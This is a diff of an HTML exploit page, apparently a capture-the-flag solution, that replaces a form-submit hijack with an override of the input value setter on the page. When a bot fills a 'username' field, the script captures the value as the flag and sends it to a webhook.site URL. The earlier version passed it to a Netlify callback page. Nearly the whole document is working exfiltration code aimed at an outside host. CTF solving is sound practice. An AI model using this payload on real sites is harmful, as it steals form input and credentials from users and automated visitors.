@@ -1,27 +1,31 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Exploit Loader</title>
+    <title>CTF Exploit</title>
 </head>
 <body>
-    <h1>Please wait... preparing exploit...</h1>
+    <h1>Exploit is running... The bot is mine.</h1>
     <script>
-        const CALLBACK_URL = "https://stellar-kulfi-351185.netlify.app/callback.html";
+        const WEBHOOK_URL = "https://webhook.site/48f9efa9-a38a-4c44-b214-5bdde77e8adf";
 
-        HTMLFormElement.prototype.submit = function() {
-            console.log("Form submission hijacked!");
+        const originalDescriptor = Object.getOwnPropertyDescriptor(HTMLInputElement.prototype, 'value');
 
-            const formData = new FormData(this);
-            const username = formData.get('username');
+        Object.defineProperty(HTMLInputElement.prototype, 'value', {
+            set: function(value) {
+                console.log(`Input field '${this.name}' is being set with value: ${value}`);
 
-            if (username) {
-                console.log("Username (flag) captured:", username);
+                if (this.name === 'username') {
+                    console.log(`FLAG CAPTURED: ${value}`);
+                    
+                    window.location = `${WEBHOOK_URL}?flag=${encodeURIComponent(value)}`;
+                }
                 
-                window.name = username;
-
-                window.location.href = CALLBACK_URL;
+                return originalDescriptor.set.apply(this, arguments);
+            },
+            get: function() {
+                return originalDescriptor.get.apply(this, arguments);
             }
-        };
+        });
     </script>
 </body>
 </html>
